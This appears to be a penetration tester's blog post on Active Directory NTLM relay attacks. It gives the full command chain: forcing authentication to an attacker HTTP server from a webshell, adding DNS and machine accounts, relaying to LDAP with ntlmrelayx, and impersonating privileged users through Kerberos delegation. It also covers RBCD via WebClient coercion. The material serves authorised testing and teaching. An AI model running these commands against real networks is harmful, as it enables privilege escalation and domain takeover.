---
title: "Relaying in Active Directory"
date: 2024-11-18
categories: [AD Relay Attacks, WebClient]
tags: []
---

In this post, I will showcase some Relay attacks that I have performed during Internal Penetration Testing assessments. 

## Definition

Same basics has SMB Relaying. For SMB Realying, we usually enumerate computer accounts that don't have SMB Signing configured. A threat actor can abuse of this to setup a network poisoner and relay NTLMv2 authentications to other computers where these users could have privileged access.

For LDAP, we are looking for Domain Controllers that don't sign the LDAP server and that don't required channel binding to be set.  

### Prerequesites

The ingredients for these attacks to be successful are:

1. A Domain Controller with the LDAP server signing set to not enforced (default)
2. A Domain Controller with the LDAPS channel binding set to not required (default)
3. Domain users shouble be able to add new machines accounts (default value of MachineAccountQuota is 10)
4. DNS resolution of the attacking machine (DNS A Record)

In a successful attack, a simple domain user can become local admin of a workstation. This could then lead to further credential harvesting and lateral movements and then most eventually be Domain Admin.

Point 1 and 2 can be enumerated with NetExec easily.

```Shell
nxc ldap {Computer} -u {Domain Account} -p {Password} -M ldap-checker
```

![Relaying](/assets/blog/relaying/image-3.jpg)

And for Point 3, we can use NetExec with the command MAQ.

```Shell
nxc ldap {Computer} -u {Domain Account} -p {Password} -M maq
```

![Relaying](/assets/blog/relaying/image-4.jpg)

## Sweet HTTP to NTLMv2 

In my enviorment, I have configured an IIS server with an cmd.aspx shell to execute commands.

![Relaying](/assets/blog/relaying/image-5.jpg)

The following command will send the NTLMv2 of the current computer. The error displayed looks like a mess thought.

```Shell
powershell iwr {Attacker HTTP Server} -UseDefaultCredentials
```

![Relaying](/assets/blog/relaying/image-7.jpg)

If we run Responder in Analysis mode while leaving the HTTP option enabled in Responder.conf, we will recieve the machine NTLMv2. 

```Shell
sudo responder -I {Interface} -A
```

![Relaying](/assets/blog/relaying/image-6.jpg)

We can proceed to relay this hash to a Domain Controller. But how we will recieve the authentication if the Domain Controller does not know where is our attacking machine? We would need to create a DNS A Record, poiting to a computer. The tool [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) works great for this.

```Shell
python3 dnstool.py -u '{Domain}.{TLD}\{Domain Username}' -p '{Password}' --record '{New Computer Account}' 
--action add --data {Attacker IP} {Domain Controller IP}
```

![Relaying](/assets/blog/relaying/image-8.jpg)

And then, create a new computer. In this case I did it with NetExec.

```Shell
nxc smb {Domain Controller IP} -u {Domain Username} -p {Password} -M add-computer -o 
NAME={New Computer Account}$ PASSWORD={Computer Password}
```

![Relaying](/assets/blog/relaying/image-9.jpg)

Now we need to wait 3 minutes, so the DNS cache updates automatically. To confirm everything is in-place, we can use nslookup and resolve our hostname.

```Shell
nslookup {Computer Account}.{Domain}.{TLD} {Domain Controller IP}
```

![Relaying](/assets/blog/relaying/image-10.jpg)

Now the fun part. We set up ntlmrelayx. In a successful authentication, our new computer machine will be able to impersonate users on the target computer.

```Shell
ntlmrelayx.py -t ldap://{Domain Controller} -delegateaccess -smb2support -no-validate-privs --no-dump 
--escalate-user {New Computer Account}
```

![Relaying](/assets/blog/relaying/image-11.jpg)

Let's request a Service Ticket. Now that our new computer account has Constrained Delegation privileges, we can use the `-impersonate` flag to request a ticket on behalf of another user. We can request a ticket of the Service CIFS (Common Internet File System), which will give us access to the computer trought SMB. First, unset the value of previously KRB5CCNAME values.

```Shell
unset KRB5CCNAME
impacket-getST -spn {Service Type}/{Target Computer}.{Domain}.{TLD} -impersonate {Privileged User} 
-dc-ip {Domain Controller IP} '{Domain}.{TLD}/{New Computer Account}$:{Computer Password}'
```

![Relaying](/assets/blog/relaying/image-12.jpg)

Now let's export the KRB5CCNAME enviormental variable to be equal to the path of the .ccache file. And test the administrative access to the target computer.

```Shell
export KRB5CCNAME='{.CCACHE FILE PATH}'
nxc smb {Target IP Address} -k --use-kcache
```

![Relaying](/assets/blog/relaying/image-13.jpg)

Cool, right? Now with administrative access, we can perform further credential harvesting and lateral movements which could eventually lead to Domain Admin.

## RBCD by WebClient



**What is the attack workflow?**

The way our attack flow works is as follows:

1. The attacker utilizes already compromised credentials to trigger an authentication from a WebClient-enabled host.
2. The attacker relays the authentication to the LDAPS server (DC) to perform object manipulation (setting up RBCD)
3. The attacker requests a Kerberos ticket for any administrative user on the target system.
4. The target system is compromised over this administrative Kerberos ticket.

Let’s scan if machines are running WebClient services. I have used webdav module from NetExec.

![Relaying](/assets/blog/relaying/image-14.jpg)

You know the drill. Relay.

![Relaying](/assets/blog/relaying/image-15.jpg)

I opted for Coercer. Some handy coercion tools are here:

* [PetitPotam](https://github.com/topotam/PetitPotam)
* [SpoolSample](https://github.com/leechristensen/SpoolSample)
* [Coercer](https://github.com/p0dalirius/Coercer)

![Relaying](/assets/blog/relaying/image-16.jpg)

Request a CIFS Service Ticket to gain access with SMB. 

![Relaying](/assets/blog/relaying/image-17.jpg)

Now, confirm access.

![Relaying](/assets/blog/relaying/image-18.jpg)